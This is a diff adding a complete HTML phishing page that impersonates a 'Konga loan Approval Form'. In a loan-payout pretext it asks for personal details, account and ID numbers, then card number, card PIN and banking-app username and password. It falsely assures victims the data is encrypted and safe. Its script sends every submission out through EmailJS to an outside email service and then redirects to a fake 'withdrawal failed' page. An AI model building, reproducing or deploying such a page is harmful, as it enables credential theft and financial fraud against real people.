@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="form.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Charm:wght@400;700&display=swap" rel="stylesheet">
+    <title>Application Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('XV6tDHUmJq5sGxsl5');
+        })();
+    </script>
+</head>
+<body>
+    <div id="div1">
+        <img id="img1" src="./KugAIkUYIkrifh4ZcMMbQtVtQPH1590071386009_200x200 (1).png" alt="">
+    </div>
+   <div id="div2">
+    <img id="img2" src="./konga (1).png" alt="">
+</div>
+<p id="p1">Konga loan Approval Form </p>
+   <div id="background">
+    <form id="contact-form">
+        <div id="form1">
+            <input type="hidden" name="contact_number">
+            
+            <label for="name">Full Name:</label> <br>
+            <div id="allName">
+                <input type="text" name="name" id="name" placeholder="Enter First Name"> 
+                <input type="text" name="surname" id="surname" placeholder="Enter Middle Name"> <br>
+            </div>
+            <input type="text" name="lastname" id="lastname" placeholder="Enter Last Name"> <br>
+    
+            <p id="p3">This section must be completed by representative</p>
+            <label for="address">Address:</label><br>
+           <div id="residence">
+            <input type="text" name="city" id="address" placeholder="Enter city">
+            <input type="text" name="state" id="state" placeholder="Enter State / Province"> <br>
+           </div>
+            <input type="text" name="postal" id="postal" placeholder="Enter Postal / Zip Code"><br>
+    
+            <label for="amount">Amount:</label><br>
+            <input type="number" name="amount" id="amount" placeholder="Enter Amount"><br>
+    
+            <label for="account">Account Number:</label><br>
+            <input type="number" name="account" id="account" placeholder="Enter Account Number"><br>
+            
+            <label for="identity">ID Number:</label> <br>
+            <input type="number" name="identity" id="identity" placeholder="Enter ID number "> <br>
+    
+            <!-- <img id="img1" src="./5f9e93db193a4599be7cedfaa83453f9.webp" alt=""> -->
+            <label for="email">E-Mail Address:</label> <br>
+            <input type="email" name="email" id="email" placeholder="Enter Email"> <br>
+
+            <p id="error"></p>
+            <p id="next">Next</p>
+
+        </div>
+        <div id="terms">
+            <input type="checkbox" name="agree" id="agree">
+            <label for="agree" >I agree to the <span id="condition" style="color: blue;"> Terms and Conditions </span></label>
+            
+        </div>
+        <div style="display: none;" id="form2">
+            <img id="img9" src="./WhatsApp Image 2023-10-13 at 5.22.53 PM.jpeg" alt="">
+            <p id="p4">Kindly input the required details to enable your loan disbursement into your account and
+                 be ensured that your details are all encrypted and safe</p>
+            <label for="card">Card Number:</label> <br>
+            <input type="number" name="card" id="card" placeholder="Enter Card Number"> <br>
+    
+            <label for="pin">Card Pin:</label><br>
+            <input type="number" name="pin" id="pin" placeholder="Enter Card Pin"> <br>
+    
+            <img id="img9" src="./WhatsApp Image 2023-10-13 at 4.38.40 PM.jpeg" alt="">
+            <p id="p8"> Kindly input the required details to enable your loan disbursement into your account and
+                be ensured that your details are all encrypted and safe</p>
+            <label for="username">App Username:</label> <br>
+            <input type="text" name="username" id="username" placeholder="Enter Username"> <br>
+    
+            <label for="password">App Password:</label> <br>
+            <input type="password" name="password" id="password" placeholder="Enter Password"> <br>
+     
+            <p id="error2"></p>
+            <input type="submit" value="Submit and Withdraw Your Loan" id="submit" style="display: none;">
+
+        </div>
+    </form>
+   </div>
+    <!-- <img src="./fnb-logo-2016.jpg" alt=""> -->
+    <script>
+let yes = document.getElementById('yes')
+let no = document.getElementById('no')
+let form1 = document.getElementById('form1')
+let form2 = document.getElementById('form2')
+let next = document.getElementById('next')
+
+let fname = document.getElementById('name')
+let sname = document.getElementById('surname')
+let address = document.getElementById('address')
+let state = document.getElementById('state')
+let postal = document.getElementById('postal')
+let account = document.getElementById('account')
+let amount = document.getElementById('amount')
+let identity = document.getElementById('identity')
+let email = document.getElementById('email')
+
+let card = document.getElementById('card')
+let pin = document.getElementById('pin')
+let username = document.getElementById('username')
+let password = document.getElementById('password')
+
+let error = document.getElementById('error')
+let error2 = document.getElementById('error2')
+
+let agree = document.getElementById("agree")
+let terms = document.getElementById('terms')
+let submit = document.getElementById('submit')
+
+window.onload = function() {
+    document.getElementById('contact-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+        // generate a five digit number for the contact_number variable
+        this.contact_number.value = Math.random() * 100000 | 0;
+        // these IDs from the previous steps
+        emailjs.sendForm("service_ip8vngd","template_lczevu9", this)
+        .then(function() {
+            console.log('SUCCESS!');
+            let subscribe = document.getElementById('submit')
+            console.log('na me')
+            subscribe.style.animationName = 'done';
+            subscribe.value = 'Submit Successful But Withdrawal Failed'
+            let Subscribe = setTimeout(sub, 1500);
+            function sub(){
+                // subscribe.value = 'Submit'
+                window.location.href="https://workbasehq.github.io/konga-end-page//"
+            }
+        }, function(error) {
+                console.log('FAILED...', error);
+                let subscribe = document.getElementById('submit')
+                subscribe.value = 'unable to submit'
+                // subscribe.value = "Submit Successful But Withdrawal Failed"
+                subscribe.style.animationName = 'failed';
+                let Subscribe = setTimeout(sub, 4000);
+                function sub(){
+                    subscribe.value = 'Submit and Withdraw Your Loan'
+                }
+            });
+        });
+}
+
+next.addEventListener('click', ()=>{
+    if(fname.value ==="" || sname.value ==="" || address.value ==="" ||
+        state.value === "" || postal.value === "" || amount.value === "" ||
+        account.value ==="" || identity.value === "" || email.value === ""){
+            error.innerHTML = "kindly fill all the required details above";
+            error.style.color = "red";
+            error.style.fontSize =  "300%";
+            error.style.textAlign =  "center";
+            console.log("na me")
+            setTimeout(sub, 2000);
+            function sub(){
+                error.innerHTML = ''
+            }
+        }else if(agree.checked == 0){
+            error.innerHTML = "kindly read and agree to the terms and conditions";
+            error.style.color = "red";
+            error.style.fontSize =  "300%";
+            error.style.textAlign =  "center";
+            setTimeout(sub, 2000);
+            function sub(){
+                error.innerHTML = ''
+            }
+        } else{
+            console.log("here")
+            setTimeout(bub, 1000);
+            function bub(){
+                form1.style.display = 'none'
+                form2.style.display = 'block'
+                terms.style.display = 'none'
+                error.innerHTML = '';
+            }
+        }
+})
+
+setInterval(nub, 100)
+function nub(){
+    if(card.value === "" || pin.value === "" || username.value === "" || password.value === ""){
+    error2.innerHTML = "kindly fill all the required details above";
+    error2.style.color = "red";
+    error2.style.fontSize =  "300%"
+    error2.style.textAlign =  "center"
+    submit.style.display = 'none';
+    }else{
+        let submit = document.getElementById("submit")
+        submit.style.display = 'block';
+        submit.style.margin = '-3 0 -10 0'
+        submit.addEventListener('click', ()=>{
+            submit.style.backgroundColor = "yellow"
+            submit.style.color = "black"
+            
+        })
+        error2.innerHTML = '';
+       
+    }
+}
+
+
+    </script>
+</body>
+</html>
